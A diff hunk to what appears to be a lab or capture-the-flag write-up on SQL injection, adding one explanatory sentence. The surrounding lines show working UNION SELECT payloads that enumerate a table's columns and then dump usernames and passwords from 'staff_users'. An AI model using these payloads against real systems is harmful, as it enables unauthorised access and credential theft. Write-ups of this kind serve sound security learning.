@@ -62,6 +62,7 @@ The information we want to retrieve has changed from table_name to `column_name
 
     0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
 ![columns](images/14-all-columns.png)<br/>
+We get all the columns name of `stuff_users` table
 
     0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
 ![password](images/15-password.png)<br/>
